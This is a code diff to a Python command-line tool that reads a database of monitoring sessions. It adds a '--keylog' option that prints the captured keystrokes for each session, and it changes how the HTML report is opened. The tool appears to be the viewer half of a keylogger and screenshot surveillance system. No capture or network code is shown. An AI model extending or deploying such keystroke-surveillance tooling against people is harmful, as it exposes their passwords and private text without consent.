@@ -264,9 +264,35 @@ def cmd_html(conn, sid: int | None = None, out_file: str = "report.html"):
         f.write(html)
     print(f"Report written to: {os.path.abspath(out_file)}")
     try:
-        subprocess.Popen(["xdg-open", out_file])
+        subprocess.Popen(["open", out_file])
     except FileNotFoundError:
-        pass
+        try:
+            subprocess.Popen(["xdg-open", out_file])
+        except FileNotFoundError:
+            pass
+
+# ── keylog view ───────────────────────────────────────────────────────────────
+
+def cmd_keylog(conn, sid: int | None = None):
+    sessions = [get_session(conn, sid)] if sid else all_sessions(conn)
+
+    found = False
+    for s in sessions:
+        logs = conn.execute(
+            "SELECT timestamp, data FROM events WHERE session_id=? AND type='keylog' ORDER BY timestamp",
+            (s["id"],),
+        ).fetchall()
+        if not logs:
+            continue
+        found = True
+        print(f"\n{'─'*60}")
+        print(f"  Sesja #{s['id']}  —  {s['start_time']}")
+        print(f"{'─'*60}")
+        full_text = "".join(row["data"] for row in logs if row["data"])
+        print(full_text)
+
+    if not found:
+        print("Brak keylogów." + (f" w sesji #{sid}" if sid else ""))
 
 # ── CLI ───────────────────────────────────────────────────────────────────────
 
@@ -278,6 +304,7 @@ def main():
     )
     parser.add_argument("--session", type=int, metavar="N", help="Focus on session #N")
     parser.add_argument("--html",    action="store_true",    help="Export HTML report")
+    parser.add_argument("--keylog",  action="store_true",    help="Show only keystrokes")
     parser.add_argument("--open",    type=int, metavar="N",  help="Open screenshots from session #N")
     parser.add_argument("--delete",  type=int, metavar="N",  help="Delete session #N")
     parser.add_argument("--out",     default="report.html",  help="HTML output filename")
@@ -289,6 +316,8 @@ def main():
         cmd_open(conn, args.open)
     elif args.delete:
         cmd_delete(conn, args.delete)
+    elif args.keylog:
+        cmd_keylog(conn, args.session)
     elif args.html:
         cmd_html(conn, args.session, args.out)
     elif args.session:
